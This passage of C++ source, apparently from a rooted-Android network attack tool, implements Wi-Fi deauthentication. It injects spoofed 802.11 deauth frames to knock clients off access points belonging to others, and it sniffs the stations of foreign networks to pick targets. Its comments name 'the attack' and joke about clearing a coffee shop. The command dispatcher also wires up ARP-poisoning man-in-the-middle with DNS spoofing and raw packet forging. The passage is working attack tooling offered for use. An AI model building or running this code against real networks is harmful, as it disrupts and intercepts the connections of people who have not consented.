  // The neighbour table is the fresher of the two when the station has just
  // associated and /proc/net/arp has not caught up yet.
  std::string out;
  if (runCmd("ip neigh show to " + ip + " 2>/dev/null", out)) {
    for (auto& tok : split(out, ' ')) {
      std::string c = lower(trim(tok));
      if (isMac(c)) return c;
    }
  }
  return "";
}

static bool looksLikeIpv4(const std::string& s) {
  struct in_addr a{};
  return inet_pton(AF_INET, s.c_str(), &a) == 1;
}

// deauth <iface> <target> <intervalMs> [reason] [count] [clientMac] [chan]
//
// `target` is a BSSID on a monitor-mode interface, a client MAC or an IP on a
// soft AP, or "all"/"*"/"" to sweep every station currently associated. `count`
// > 0 sends that many frames and exits; 0 loops until SIGTERM, which is what the
// "kill" toggle runs.
//
// `clientMac` narrows a monitor-mode run to one station of the access point
// named by `target`, which is the whole difference between a deauthentication
// that clears the coffee shop and one that only moves the one phone you picked.
// It is ignored on a soft AP, where hostapd already drops exactly the station
// that was named by `target` and a second address would be ambiguous.
//
// `freqMhz` is the centre frequency the target AP is on, from the scan. A
// monitor radio does not scan, so without this the frames go out on whatever
// frequency the radio happened to be sitting on and the attack does nothing
// while appearing to run perfectly. 0 means "unknown", which is left as-is.
//
// The frequency is passed rather than a channel number because channel numbers
// collide across bands: 1 is both 2412 MHz and 5955 MHz.
static void cmdDeauth(const std::string& ifn, const std::string& target,
                      int intervalMs, int reason, int count,
                      const std::string& clientMac, int freqMhz) {
  signal(SIGINT, onSig);
  signal(SIGTERM, onSig);
  bool every = target.empty() || target == "all" || target == "*";
  // A single station may be named by its IP (what the client list shows) or by
  // its MAC. The IP is resolved here, once, and every frame below is aimed at
  // the same resolved station.
  std::string targetMac = target;
  bool byIp = false;
  if (!every && looksLikeIpv4(target)) {
    byIp = true;
    targetMac = resolveMacForIp(target);
    if (targetMac.empty()) {
      emit("{\"type\":\"error\",\"code\":\"IP_NO_STATION\",\"msg\":" +
           J(target + " has no station behind it right now. The client may have "
                     "already left, or its address changed; list the clients "
                     "again and pick it once more.") +
           "}");
      return;
    }
  }
  // One named station on somebody else's access point. The frame still has to
  // be sourced from the access point, so the two addresses play different
  // roles: `targetMac` stays the BSSID that is spoofed, and the station is only
  // the destination.
  std::string oneClient = clientMac.empty() ? "" : lower(clientMac);
  if (!oneClient.empty()) {
    if (!isMac(oneClient)) {
      emit("{\"type\":\"error\",\"code\":\"BAD_STATION\",\"msg\":" +
           J("\"" + clientMac + "\" is not a MAC address") + "}");
      return;
    }
    if (every) {
      emit("{\"type\":\"error\",\"code\":\"NO_TARGET\",\"msg\":" +
           J("naming a single client still needs the access point it belongs "
             "to, so the frame can be sourced from it") + "}");
      return;
    }
    if (byIp || !isMac(targetMac)) {
      emit("{\"type\":\"error\",\"code\":\"BAD_BSSID\",\"msg\":" +
           J("\"" + target +
             "\" is not the MAC of an access point, so there is nothing to "
             "source the frame from") + "}");
      return;
    }
    if (oneClient == lower(targetMac)) {
      emit("{\"type\":\"error\",\"code\":\"STATION_IS_BSSID\",\"msg\":" +
           J(oneClient +
             " is the access point itself. Deauthenticating the AP only "
             "tears down the stations that are talking to it.") + "}");
      return;
    }
  }
  if (isApMode(ifn)) {
    // ap0 is the phone's own hotspot: hostapd holds the association table and
    // is the only thing that can drop a client from it. Nothing here touches a
    // packet socket -- the frame is built by hostapd -- so this path must be
    // taken before the AF_PACKET gate below, which ap0 may not pass.
    if (hostapdCtrlDir(ifn).empty()) {
      emit("{\"type\":\"error\",\"code\":\"NO_HOSTAPD\",\"msg\":" +
           J(ifn + " is a soft AP, but hostapd's control socket was not found. "
                 "Turn the hotspot off and on, then retry.") + "}");
      return;
    }
    // Here `target` already names the station, so there is no second address to
    // apply. Saying so beats quietly dropping it and reporting a success that
    // means something narrower than the caller asked for.
    if (!oneClient.empty() && lower(oneClient) != lower(targetMac)) {
      emit("{\"type\":\"error\",\"code\":\"AMBIGUOUS_TARGET\",\"msg\":" +
           J(ifn + " is a soft AP: the target already names the one client to "
                 "drop, so \"" + oneClient + "\" would be a second, conflicting "
                 "client. Pick the client on the list instead.") + "}");
      return;
    }
    emit("{\"type\":\"deauthStarted\",\"iface\":" + J(ifn) + ",\"target\":" +
         J(every ? "all" : target) + ",\"method\":\"hostapd\",\"reason\":" +
         std::to_string(reason) + ",\"count\":" + std::to_string(count) +
         // Echoed so the UI can prove the frame went to the station behind the
         // address the user picked.
         ",\"resolvedMac\":" + J(every ? std::string("") : targetMac) +
         ",\"client\":" + J(every ? std::string("") : oneClient) +
         ",\"scope\":" + J(every ? "all" : "station") +
         ",\"byIp\":" + std::string(byIp ? "true" : "false") + "}");
    int sent = 0;
    long long t0 = nowMs();
    if (intervalMs < 5) intervalMs = 5;
    while (!g_stop && (count <= 0 || sent < count)) {
      // Re-read the association table every tick in "all" mode: a client that
      // reconnects is picked up without restarting the job.
      std::vector<std::string> targets;
      if (every) {
        for (auto& s : hostapdStations(ifn)) targets.push_back(s.mac);
      } else {
        targets.push_back(targetMac);
      }
      std::string res;
      for (auto& mac : targets)
        if (hostapdDeauth(ifn, mac, res)) sent++;
      if (targets.empty())
        emit("{\"type\":\"deauthIdle\",\"msg\":\"no station is associated\"}");
      emit("{\"type\":\"deauthStats\",\"sent\":" + std::to_string(sent) +
           ",\"elapsedMs\":" + std::to_string(nowMs() - t0) + "}");
      if (count > 0 && sent >= count) break;
      usleep((useconds_t)intervalMs * 1000);
    }
    emit("{\"type\":\"deauthStopped\",\"sent\":" + std::to_string(sent) + "}");
    return;
  }
  if (every) {
    // There is no "all stations" concept for an AP that is not ours; the
    // caller has to name a BSSID.
    emit("{\"type\":\"error\",\"code\":\"NO_TARGET\",\"msg\":" +
         J(ifn + " is not a soft AP: pick an access point to target instead "
                "of \"all\"") + "}");
    return;
  }
  Raw raw;
  raw.ifname = ifn;
  if (!raw.openPacket()) {
    emit("{\"type\":\"error\",\"msg\":" +
         J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
    return;
  }
  if (!isMonitorMode(ifn)) {
    emit("{\"type\":\"error\",\"code\":\"NOT_MONITOR\",\"msg\":" +
         J("interface " + ifn +
           " is not in monitor mode \u2014 the Wi-Fi module can switch it with "
           "nl80211 even without iw installed") + "}");
    return;
  }
  // Tune before the first frame, and only warn on failure: a dual-band radio
  // may already be on the right channel, and reporting a hard error here would
  // block an attack that would otherwise work.
  std::string tuneErr = tuneFreq(ifn, freqMhz);
  if (freqMhz > 0 && tuneErr.empty()) {
    // The radio usually takes a few milliseconds to settle onto the new
    // channel; sending the first frame into that window loses it.
    usleep(120 * 1000);
  }
  unsigned char frame[64];
  // One station named, or the whole access point. The destination is what makes
  // the difference: broadcast reaches every client the AP is serving, while a
  // single station's address keeps the rest of the network online. Monitor-mode
  // injection carries no L2 addressing of its own, so the 802.11 DA is the only
  // thing that decides who hears it.
  std::string dest = oneClient.empty() ? "ff:ff:ff:ff:ff:ff" : oneClient;
  size_t flen = build80211Deauth(lower(targetMac), dest, (uint8_t)reason, frame);
  emit("{\"type\":\"deauthStarted\",\"iface\":" + J(ifn) + ",\"target\":" + J(target) +
       ",\"resolvedMac\":" + J(lower(targetMac)) +
       ",\"client\":" + J(oneClient) +
       ",\"scope\":" + J(oneClient.empty() ? "bssid" : "station") +
       ",\"byIp\":" + std::string(byIp ? "true" : "false") +
       ",\"freqMhz\":" + std::to_string(freqMhz) +
       // A blank warning is omitted rather than emitted empty, so the UI can
       // treat presence as "show this".
       (tuneErr.empty()
            ? std::string("")
            : (",\"warning\":" + J("could not tune the radio to " +
                                   std::to_string(freqMhz) + " MHz: " + tuneErr +
                                   ". The frames will be sent on the current "
                                   "channel, so this may have no effect."))) +
       ",\"reason\":" + std::to_string(reason) + ",\"count\":" +
       std::to_string(count) + ",\"frame\":" + J(hexOf(frame, flen)) + "}");
  int sent = 0;
  long long t0 = nowMs();
  if (intervalMs < 5) intervalMs = 5;
  while (!g_stop && (count <= 0 || sent < count)) {
    if (raw.sendL2(frame, flen, dest, ETH_P_IEEE80211_RADIOTAP)) sent++;
    long long el = nowMs() - t0;
    emit("{\"type\":\"deauthStats\",\"sent\":" + std::to_string(sent) +
         ",\"elapsedMs\":" + std::to_string(el) + "}");
    if (count > 0 && sent >= count) break;
    usleep((useconds_t)intervalMs * 1000);
  }
  emit("{\"type\":\"deauthStopped\",\"sent\":" + std::to_string(sent) + "}");
}

// sta <iface> — the stations associated with a soft AP, i.e. the clients that
// can be dropped from the phone's own hotspot. The AP interface is the one
// place a "who is on my network" list is actually useful, so it gets its own
// command rather than being inferred from the ARP table in the UI.
// Stations of an access point that is not ours, read off the air.
//
// hostapd can only answer for the phone's own soft AP, and on a station
// interface the neighbour table holds the router's proxy-ARP answers rather
// than the real station addresses. Neither source identifies the clients of a
// foreign access point. The frames themselves do: in monitor mode the radio
// hears every network in range, so attributing each frame to the BSSID it was
// sent through is what separates this AP's clients from the neighbours.
//
// Worth being plain about the limit, because it is not a small one: this is an
// observation, not an association table. A station that is associated but has
// nothing to transmit during the listen window does not appear at all, and what
// is reported is "this station sent a frame that this access point was part of",
// not "this station is authenticated to that BSSID".
static bool sniffStations(const std::string& ifn, const std::string& bssid,
                          int freqMhz, int listenMs, std::vector<Sta>* out,
                          std::string* msg) {
  Raw raw;
  raw.ifname = ifn;
  if (!raw.openPacket()) {
    emit("{\"type\":\"error\",\"msg\":" +
         J(std::string("AF_PACKET unavailable: ") + strerror(errno)) + "}");
    return false;
  }
  if (!isMonitorMode(ifn)) {
    emit("{\"type\":\"error\",\"code\":\"NOT_MONITOR\",\"msg\":" +
         J("interface " + ifn +
           " is not in monitor mode. In managed mode the hardware filters out "
           "everything but this phone's own traffic, so no other station is "
           "visible. Switch monitor mode on first.") + "}");
    return false;
  }
  if (listenMs < 1000) listenMs = 1000;
  if (listenMs > 30000) listenMs = 30000;

  // Sniffing needs the channel even more than injecting does. A monitor radio
  // hears one channel, so on the wrong one the capture window fills with frames
  // from other networks and this access point's stations never appear -- which
  // reads as "no clients", the most misleading answer available.
  std::string tuneErr = tuneFreq(ifn, freqMhz);
  if (!tuneErr.empty()) {
    emit("{\"type\":\"error\",\"code\":\"CHANNEL_FAILED\",\"msg\":" +
         J("could not tune " + ifn + " to " + std::to_string(freqMhz) + " MHz: " +
           tuneErr + ". The list below would only cover whatever the radio is on "
           "now, so treat it as partial.") + "}");
    return false;
  }
  if (freqMhz > 0) usleep(120 * 1000);

  std::map<std::string, int64_t> lastSeen;
  long long total = 0;
  unsigned char buf[2048];
  int64_t deadline = nowMs() + listenMs;
  while (!g_stop && nowMs() < deadline) {
    ssize_t n = raw.recvL2(buf, sizeof buf, 250);
    if (n <= 0) continue;
    std::string st = stationOf80211(buf, (size_t)n, bssid);
    if (st.empty()) continue;
    lastSeen[st] = nowMs();
    total++;
  }

  // Most recently heard first: that is the station most likely still to be there
  // when the user presses the button.
  std::vector<std::pair<int64_t, std::string>> ordered;
  ordered.reserve(lastSeen.size());
  for (auto& e : lastSeen) ordered.push_back({e.second, e.first});
  std::sort(ordered.begin(), ordered.end(),
            [](const std::pair<int64_t, std::string>& a,
               const std::pair<int64_t, std::string>& b) {
              return a.first > b.first;
            });
  for (auto& o : ordered) {
    Sta s;
    s.mac = o.second;
    // A capture carries no signal level for a station's most recent frame: the
    // radiotap header in front of a frame the radio received describes the
    // radio's own signal, not the station's. Left unset so the UI says "unknown"
    // rather than showing a number that is not the station's.
    s.hasSignal = false;
    out->push_back(s);
  }
  *msg = std::to_string(total) + " frame(s) from " + std::to_string(out->size()) +
         " station(s) over " + std::to_string(listenMs / 1000) + "s";
  if (out->empty())
    *msg += " — idle clients never transmit, so one that was not talking is not listed";
  return true;
}

// sta <iface> [bssid] [ms] [freqMhz] — the stations the deauth module can name a target in.
//
// The two forms answer different questions. On the phone's own hotspot the
// association table is authoritative, so hostapd is asked and the answer is
// exact. On a station interface there is no such table to ask: an access point
// that is not ours only reveals its clients by what they transmit, which is
// what the monitor-mode path does. `bssid` selects which access point to watch
// and is required for that path, because a monitor-mode radio hears every
// network in range at once. `chan` puts the radio on that access point's
// frequency, which without it means listening to whichever channel the radio
// happened to land on.
static void cmdSta(const std::string& ifn, const std::string& bssid, int freqMhz,
                   int listenMs) {
  bool ap = isApMode(ifn);
  std::vector<Sta> stas;
  std::string source;
  std::string msg;

  if (ap) {
    source = "hostapd";
    if (hostapdCtrlDir(ifn).empty()) {
      emit("{\"type\":\"error\",\"code\":\"NO_HOSTAPD\",\"msg\":" +
           J("hostapd's control socket was not found; the hotspot has to be "
             "running for its clients to be listed") + "}");
      return;
    }
    stas = hostapdStations(ifn);
    if (stas.empty()) {
      // hostapd knows the association table; when it cannot be reached the
      // neighbour table on the AP's own subnet is the next best answer, and it
      // is the same set of machines.
      for (auto& p : readArpPairs()) {
        Sta s;
        s.mac = p.second;
        s.ip = p.first;
        stas.push_back(s);
      }
      source = "arp";
      if (!stas.empty())
        msg = "hostapd did not answer; listing the hotspot's neighbour table";
    }
    // Fill in the addresses the association table does not carry.
    if (!stas.empty()) {
      auto pairs = readArpPairs();
      for (auto& s : stas) {
        if (!s.ip.empty()) continue;
        for (auto& p : pairs)
          if (p.second == s.mac) { s.ip = p.first; break; }
      }
    }
  } else {
    if (bssid.empty()) {
      emit("{\"type\":\"error\",\"code\":\"NO_BSSID\",\"msg\":" +
           J("pick an access point first: " + ifn +
             " is not a soft AP, so there is no association table to read and "
             "the only way to find its clients is to watch the frames it "
             "carries") + "}");
      return;
    }
    if (!isMac(bssid)) {
      emit("{\"type\":\"error\",\"code\":\"BAD_BSSID\",\"msg\":" +
           J("\"" + bssid + "\" is not a MAC address") + "}");
      return;
    }
    source = "monitor";
    if (!sniffStations(ifn, bssid, freqMhz, listenMs, &stas, &msg)) return;
  }

  std::string items = "[";
  for (size_t i = 0; i < stas.size(); i++) {
    if (i) items += ",";
    items += "{\"mac\":" + J(stas[i].mac) + ",\"ip\":" + J(stas[i].ip) +
             ",\"signal\":" + (stas[i].hasSignal ? std::to_string(stas[i].signal)
                                                : std::string("0")) +
             ",\"hasSignal\":" + (stas[i].hasSignal ? "true" : "false") + "}";
  }
  items += "]";
  emit("{\"type\":\"staList\",\"iface\":" + J(ifn) + ",\"apMode\":" +
       (ap ? "true" : "false") + ",\"source\":" + J(source) +
       ",\"count\":" + std::to_string(stas.size()) + ",\"clients\":" + items +
       ",\"msg\":" + J(msg) + "}");
}

// monitor <iface> <0|1> — try to flip the interface into/out of monitor mode
static void cmdMonitor(const std::string& ifn, int on) {
  // AP mode is not negotiable: moving ap0 out of soft-AP breaks the hotspot,
  // and hostapd will not let it. Say so instead of half-doing it.
  if (on && isApMode(ifn)) {
    emit("{\"type\":\"monitorResult\",\"iface\":" + J(ifn) +
         ",\"ok\":false,\"monitorMode\":false,\"apMode\":true,\"method\":\"hostapd\""
         ",\"msg\":" +
         J(ifn + " is a soft AP (hotspot). Its clients are dropped through "
               "hostapd, not by switching the interface to monitor mode.") +
         "}");
    return;
  }

  // Turning it off, on an interface this app created: retire the vif and leave
  // the original station alone instead of converting anything back.
  if (!on && ifn.rfind("mon", 0) == 0) {
    std::string err = deleteVif(ifn);
    emit("{\"type\":\"monitorResult\",\"iface\":" + J(ifn) +
         ",\"ok\":" + (err.empty() ? "true" : "false") +
         ",\"monitorMode\":false,\"method\":\"nl80211-vif\",\"out\":" + J(err) +
         ",\"msg\":" + J(err.empty() ? "monitor interface " + ifn + " removed" : err) + "}");
    return;
  }

  // Turning it on: prefer a second virtual interface. Converting the station
  // interface itself drops this device off the network, and the scan that found
  // the access point needed that connection -- so the two steps would be
  // mutually exclusive. A second vif lets the original stay associated.
  if (on) {
    std::string phy = phyNameOf(ifn);
    if (!phy.empty()) {
      // mon0 may already exist on devices that ship one; try a few names
      // instead of picking one and failing.
      static const char* kNames[] = {"mon0", "mon1", "mon2"};
      for (const char* cand : kNames) {
        if (if_nametoindex(cand)) continue;
        std::string made;
        std::string err =
            createMonitorVif(phy, cand, if_nametoindex(ifn.c_str()), &made);
        if (err.empty()) {
          setIfaceUp(made, true);
          emit("{\"type\":\"monitorResult\",\"iface\":" + J(made) +
               ",\"ok\":true,\"monitorMode\":true,\"method\":\"nl80211-vif\""
               ",\"out\":\"\",\"parent\":" + J(ifn) + ",\"lostLink\":false" +
               ",\"msg\":" + J("monitor interface " + made + " created; " + ifn +
                              " stays connected") + "}");
          return;
        }
      }
      // No vif available: fall through and convert the station interface,
      // which costs this device its own connection. The fallback path below
      // reports that honestly rather than implying connectivity survived.
    }
  }

  // leave managed mode first -- most drivers refuse a direct managed->monitor
  // transition while the interface is up.
  setIfaceUp(ifn, false);
  std::string method = "nl80211";
  std::string out;
  bool ok = false;
  std::string iw;
  if (!runCmd("command -v iw", iw) && iw.empty()) {
    // No iw: do exactly what it would have done over generic netlink.
    out = nl80211SetIftype(ifn, on ? nl::kMonitor : 2 /* MANAGED */);
    ok = out.empty();
  } else {
    method = "iw";
    ok = on ? runCmd("iw dev " + ifn + " set monitor otherbss", out)
            : runCmd("iw dev " + ifn + " set type managed", out);
  }
  if (on) setIfaceUp(ifn, true);
  bool monitor = isMonitorMode(ifn);
  bool good = ok && monitor == (on != 0);
  emit("{\"type\":\"monitorResult\",\"iface\":" + J(ifn) + ",\"ok\":" +
       (good ? "true" : "false") +
       ",\"monitorMode\":" + (monitor ? "true" : "false") +
       ",\"method\":" + J(method) + ",\"out\":" + J(out) +
       ",\"lostLink\":" + (on && good ? "true" : "false") +
       ",\"msg\":" + J(good
                                   ? (on
                                          ? std::string("this driver would not allow a second "
                                                        "interface, so ") + ifn +
                                            " itself entered monitor mode and this device is now "
                                            "off the network"
                                          : std::string())
                                   : (out.empty() ? "driver refused the mode change" : out)) +
       "}");
}

// ifaces — everything the UI needs to populate the interface picker
static void cmdIfaces() {
  std::string out = "[";
  bool first = true;
  std::vector<std::string> dir = listDir("/sys/class/net");
  std::string gw = defaultGateway();
  for (auto& name : dir) {
    std::string ip = ifaceIp(name), mask = ifaceMask(name);
    if (ip.empty()) continue;
    if (first) first = false; else out += ",";
    out += "{\"name\":" + J(name) + ",\"ip\":" + J(ip) + ",\"netmask\":" + J(mask) +
           ",\"cidr\":" + J(ip + "/" + std::to_string(netmaskToPrefix(mask))) +
           ",\"mac\":" + J(macOf(name)) + ",\"gateway\":" + J(gw) +
           ",\"isGateway\":" + std::string(ip == gw ? "true" : "false") +
           ",\"monitorMode\":" + std::string(isMonitorMode(name) ? "true" : "false") +
           "}";
  }
  out += "]";
  emit("{\"type\":\"ifaces\",\"items\":" + out + "}");
}

// magisk — report what Magisk exposes, so the UI can be honest about it
static void cmdMagisk() {
  std::string v, out;
  bool hasDir = access("/data/adb/magisk", F_OK) == 0;
  bool hasDb  = access("/data/adb/magisk.db", F_OK) == 0;
  std::string ver;
  runCmd("magisk -v 2>/dev/null", ver);
  std::string suVer;
  runCmd("su -v 2>/dev/null", suVer);
  std::string selinux;
  runCmd("getenforce 2>/dev/null", selinux);
  std::string uid = std::to_string(getuid());
  std::string groups;
  runCmd("id 2>/dev/null", groups);
  std::string modules;
  runCmd("ls /data/adb/modules 2>/dev/null", modules);
  std::string kpm;
  runCmd("ls /data/adb/modules 2>/dev/null | tr '\\n' ' '", kpm);
  emit("{\"type\":\"magisk\",\"detected\":" +
       std::string(hasDir || !ver.empty() ? "true" : "false") +
       ",\"version\":" + J(ver) + ",\"suVersion\":" + J(suVer) +
       ",\"dataDir\":" + std::string(hasDir ? "true" : "false") +
       ",\"db\":" + std::string(hasDb ? "true" : "false") +
       ",\"selinux\":" + J(selinux) + ",\"uid\":" + uid + ",\"id\":" + J(groups) +
       ",\"modules\":" + J(trim(kpm)) + "}");
}

// ------------------------------------------------------------------- main
// radio <0|1> — turn the wifi hardware off (0) or back on (1).
//
// "Stop wifi" is a bigger hammer than kicking clients: the radio goes down, so
// the hotspot disappears and nothing can reassociate. Android will not let a
// normal app flip the global wifi switch, but under uid 0 the shell API does,
// and that is what tears down ap0 along with wlan0. Bringing the interfaces
// down afterwards is a belt-and-braces step for drivers whose framework hook
// is slow to act.
static void cmdRadio(int on) {
  std::string method, detail;
  bool ok = false;
  if (on) {
    // set-wifi-enabled is the supported path from Android 10 on; the "svc wifi"
    // spelling is kept only as an older fallback.
    if (runCmd("cmd wifi set-wifi-enabled enabled 2>&1", detail)) ok = true;
    if (!ok && runCmd("svc wifi enable 2>&1", detail)) ok = true;
    method = "cmd wifi";
  } else {
    if (runCmd("cmd wifi set-wifi-enabled disabled 2>&1", detail)) ok = true;
    if (!ok && runCmd("svc wifi disable 2>&1", detail)) ok = true;
    method = "cmd wifi";
  }
  std::string tail = trim(detail);
  // The shell API answers "No service" / "Error" on some builds while still
  // having applied the change, so success is judged by the interface state
  // below rather than by the message alone.
  if (tail.find("No service") != std::string::npos ||
      tail.find("Exception") != std::string::npos ||
      tail.find("Permission") != std::string::npos ||
      tail.find("denied") != std::string::npos) {
    ok = false;
    method = "unavailable";
  }

  // Both roles of the same radio matter: wlan0 is the station side, ap0 is the
  // soft AP, and only the framework knows which one exists right now.
  std::vector<std::string> radios;
  for (auto& n : listDir("/sys/class/net")) {
    if (startsWith(n, "wlan") || startsWith(n, "ap")) radios.push_back(n);
  }
  std::string moved = "[";
  bool firstMoved = true;
  for (auto& n : radios) {
    if (!setIfaceUp(n, on != 0)) continue;
    if (!firstMoved) moved += ",";
    firstMoved = false;
    moved += J(n);
  }
  moved += "]";

  // Report what the kernel actually thinks, so the UI never has to guess.
  std::string state = "unknown";
  for (auto& n : radios) {
    unsigned fl = ifFlags(if_nametoindex(n.c_str()));
    if (!fl) continue;
    state = (fl & IFF_UP) ? "up" : "down";
    break;
  }

  emit("{\"type\":\"radioResult\",\"on\":" + std::string(on ? "true" : "false") +
       ",\"ok\":" + (ok ? "true" : "false") + ",\"method\":" + J(method) +
       ",\"state\":" + J(state) + ",\"ifaces\":" + moved + ",\"msg\":" +
       J(tail) + "}");
}

static void usage() {
  fprintf(stderr,
          "zsraw <command> [args]\n"
          "  caps     <iface>\n"
          "  ifaces\n"
          "  magisk\n"
          "  mitm     <iface> <targetIpsCsv> <intervalMs> [spoofName] [spoofIp]\n"
          "  restore  <iface> <targetIpsCsv>\n"
          "  forge    <iface> <arp|udp|icmp|deauth|auth> <k=v,k=v,...>\n"
          "  deauth   <iface> <bssid|clientMac|all> <intervalMs> [reason] "
          "[count] [clientMac] [freqMhz]\n"
          "  sta      <iface> [bssid] [listenMs] [freqMhz]\n"
          "  radio    <0|1>\n"
          "  monitor  <iface> <0|1>\n");
}

int main(int argc, char** argv) {
  if (argc < 2) { usage(); return 2; }
  std::string cmd = argv[1];
  if (cmd == "caps" && argc >= 3) {
    jsonCaps(argv[2]);
  } else if (cmd == "ifaces") {
    cmdIfaces();
  } else if (cmd == "magisk") {
    cmdMagisk();
  } else if (cmd == "mitm" && argc >= 5) {
    // The last two are optional and only carry DNS-spoof config. They are
    // positionally last rather than a separate command because spoofing needs
    // the same ARP poisoning to be in place -- a resolver that is not the
    // gateway gets no queries to answer in the first place.
    cmdMitm(argv[2], argv[3], atoi(argv[4]), argc >= 6 ? argv[5] : "",
            argc >= 7 ? argv[6] : "");
  } else if (cmd == "restore" && argc >= 4) {
    cmdRestore(argv[2], argv[3]);
  } else if (cmd == "forge" && argc >= 5) {
    cmdForge(argv[2], argv[3], argv[4]);
  } else if (cmd == "deauth" && argc >= 5) {
    cmdDeauth(argv[2], argv[3], atoi(argv[4]), argc >= 6 ? atoi(argv[5]) : 7,
              argc >= 7 ? atoi(argv[6]) : 0, argc >= 8 ? argv[7] : "",
              argc >= 9 ? atoi(argv[8]) : 0);
  } else if (cmd == "sta" && argc >= 3) {
    // The frequency trails listenMs positionally, so a caller passing only a
    // frequency has to spell out the listen window too. Kept positional to
    // match deauth rather than adding a second calling convention to learn.
    cmdSta(argv[2], argc >= 4 ? argv[3] : "", argc >= 6 ? atoi(argv[5]) : 0,
           argc >= 5 ? atoi(argv[4]) : 6000);
  } else if (cmd == "radio" && argc >= 3) {
    cmdRadio(atoi(argv[2]));
  } else if (cmd == "monitor" && argc >= 4) {
    cmdMonitor(argv[2], atoi(argv[3]));
  } else {
    usage();
    return 2;
  }
  return 0;
}
